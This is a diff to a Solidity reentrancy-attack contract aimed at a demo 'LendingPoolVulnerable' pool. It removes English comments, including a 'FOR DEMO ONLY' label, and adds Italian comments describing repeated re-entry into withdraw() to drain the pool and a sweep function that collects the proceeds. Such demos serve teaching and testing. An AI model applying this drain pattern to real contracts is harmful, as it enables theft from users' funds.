@@ -1,11 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.22;
 
-/// @dev FOR DEMO ONLY — exploits `LendingPoolVulnerable.withdraw()`.
-/// Pattern: become a contributor with a small deposit, then trigger
-/// `withdraw()` and re-enter from `receive()` until the pool is drained
-/// (capped by `MAX_REENTRIES` to keep the demo bounded).
-
 interface ILendingPoolVuln {
     function deposit() external payable;
     function withdraw(uint256 amount) external;
@@ -31,11 +26,8 @@ contract ReentrancyAttacker {
         pool.deposit{value: msg.value}();
     }
 
-    /// Allow attacker contract to fund the initial deposit
+    /// permette all'attaccante di ricevere ETH dal pool e reentrarvi chiamando `withdraw()` nuovamente finché non raggiunge il numero massimo di reentrancy o finché il pool non è più in grado di soddisfare la richiesta di prelievo
     receive() external payable {
-        // Re-enter only when called back by the pool during withdraw().
-        // `attackCount < MAX_REENTRIES` bounds the loop; the second condition
-        // prevents an out-of-gas if the pool is empty.
         if (
             attackCount < MAX_REENTRIES &&
             address(pool).balance >= attackAmount
@@ -50,8 +42,7 @@ contract ReentrancyAttacker {
         pool.withdraw(attackAmount);
     }
 
-    /// Drain accumulated ETH back to the deployer for assertion convenience
-    function sweep(address payable to) external {
+    function sweep(address payable to) external {                   // funzione di emergenza per prelevare i fondi dall'attaccante dopo l'attacco
         require(msg.sender == owner, "not owner");
         (bool ok, ) = to.call{value: address(this).balance}("");
         require(ok, "sweep failed");
